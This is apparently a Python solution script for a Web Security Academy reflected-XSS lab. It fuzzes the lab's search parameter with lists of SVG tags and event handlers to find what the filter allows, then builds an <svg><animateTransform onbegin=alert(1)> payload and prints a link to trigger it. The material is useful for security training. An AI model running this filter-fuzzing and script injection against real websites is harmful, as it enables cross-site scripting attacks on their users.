import http.client
import ssl
import urllib
import urllib.parse

LAB_ID = "???"


def GET_(
        search: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.h1-web-security-academy.net', 443
    query_params = [
        ('search', search),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", '', headers)
    return connection.getresponse()


svg_elements = [
    "<a>",
    "<animate>",
    "<animateMotion>",
    "<animateTransform>",
    "<circle>",
    "<clipPath>",
    "<defs>",
    "<desc>",
    "<ellipse>",
    "<feBlend>",
    "<feColorMatrix>",
    "<feComponentTransfer>",
    "<feComposite>",
    "<feConvolveMatrix>",
    "<feDiffuseLighting>",
    "<feDisplacementMap>",
    "<feDistantLight>",
    "<feDropShadow>",
    "<feFlood>",
    "<feFuncA>",
    "<feFuncB>",
    "<feFuncG>",
    "<feFuncR>",
    "<feGaussianBlur>",
    "<feImage>",
    "<feMerge>",
    "<feMergeNode>",
    "<feMorphology>",
    "<feOffset>",
    "<fePointLight>",
    "<feSpecularLighting>",
    "<feSpotLight>",
    "<feTile>",
    "<feTurbulence>",
    "<filter>",
    "<foreignObject>",
    "<g>",
    "<image>",
    "<line>",
    "<linearGradient>",
    "<marker>",
    "<mask>",
    "<metadata>",
    "<mpath>",
    "<path>",
    "<pattern>",
    "<polygon>",
    "<polyline>",
    "<radialGradient>",
    "<rect>",
    "<script>",
    "<set>",
    "<stop>",
    "<style>",
    "<svg>",
    "<switch>",
    "<symbol>",
    "<text>",
    "<textPath>",
    "<title>",
    "<tspan>",
    "<use>",
    "<view>",
]
events = [
    "onafterprint",
    "onafterscriptexecute",
    "onanimationcancel",
    "onanimationend",
    "onanimationiteration",
    "onanimationstart",
    "onauxclick",
    "onbeforecopy",
    "onbeforecut",
    "onbeforeinput",
    "onbeforeprint",
    "onbeforescriptexecute",
    "onbeforetoggle",
    "onbeforeunload",
    "onbegin",
    "onblur",
    "oncanplay",
    "oncanplaythrough",
    "onchange",
    "onclick",
    "onclose",
    "oncontextmenu",
    "oncopy",
    "oncuechange",
    "oncut",
    "ondblclick",
    "ondrag",
    "ondragend",
    "ondragenter",
    "ondragexit",
    "ondragleave",
    "ondragover",
    "ondragstart",
    "ondrop",
    "ondurationchange",
    "onend",
    "onended",
    "onerror",
    "onfocus",
    "onfocus(autofocus)",
    "onfocusin",
    "onfocusout",
    "onformdata",
    "onfullscreenchange",
    "onhashchange",
    "oninput",
    "oninvalid",
    "onkeydown",
    "onkeypress",
    "onkeyup",
    "onload",
    "onloadeddata",
    "onloadedmetadata",
    "onloadstart",
    "onmessage",
    "onmousedown",
    "onmouseenter",
    "onmouseleave",
    "onmousemove",
    "onmouseout",
    "onmouseover",
    "onmouseup",
    "onmousewheel",
    "onmozfullscreenchange",
    "onpagehide",
    "onpageshow",
    "onpaste",
    "onpause",
    "onplay",
    "onplaying",
    "onpointercancel",
    "onpointerdown",
    "onpointerenter",
    "onpointerleave",
    "onpointermove",
    "onpointerout",
    "onpointerover",
    "onpointerrawupdate",
    "onpointerup",
    "onpopstate",
    "onprogress",
    "onratechange",
    "onrepeat",
    "onreset",
    "onresize",
    "onscroll",
    "onscrollend",
    "onsearch",
    "onseeked",
    "onseeking",
    "onselect",
    "onselectionchange",
    "onselectstart",
    "onshow",
    "onsubmit",
    "onsuspend",
    "ontimeupdate",
    "ontoggle",
    "ontoggle(popover)",
    "ontouchend",
    "ontouchmove",
    "ontouchstart",
    "ontransitioncancel",
    "ontransitionend",
    "ontransitionrun",
    "ontransitionstart",
    "onunhandledrejection",
    "onunload",
    "onvolumechange",
    "onwebkitanimationend",
    "onwebkitanimationiteration",
    "onwebkitanimationstart",
    "onwebkitmouseforcechanged",
    "onwebkitmouseforcedown",
    "onwebkitmouseforceup",
    "onwebkitmouseforcewillbegin",
    "onwebkitplaybacktargetavailabilitychanged",
    "onwebkittransitionend",
    "onwebkitwillrevealbottom",
    "onwheel",
]
print("allowed tags:")
response = GET_(search="<svg>")
if response.status == 400 and response.read().decode() == "\"Tag is not allowed\"":
    print(f"<svg> is not allowed")
    exit(1)
print("<svg> tag is allowed")
print()

print(f"tags allowed within <svg>:")
for element in svg_elements:
    response = GET_(search=f"<svg>{element}")
    response_body = response.read().decode()
    if response.status == 400 and response_body == "\"Tag is not allowed\"":
        continue
    if response.status != 200:
        print(f"for element {element}:")
        print(f"response status: {response.status}")
        for header, value in response.headers.items():
            print(f"{header}: {value}")
        print(response_body)
    print(element)
element = "animateTransform"
print(f"<{element}> tag is allowed within <svg>")
print()

print("allowed events:")
for event in events:
    response = GET_(search=f"<svg><{element} {event}=1>")
    if response.status == 400 and response.read().decode() == "\"Event is not allowed\"":
        continue
    print(event)
event = "onbegin"
print(f"{event} event is allowed")
print()

search = f"""<svg><{element} {event}=alert(1)>"""
print(f"visit link: https://{LAB_ID}.h1-web-security-academy.net?search={urllib.parse.quote_plus(search)}")
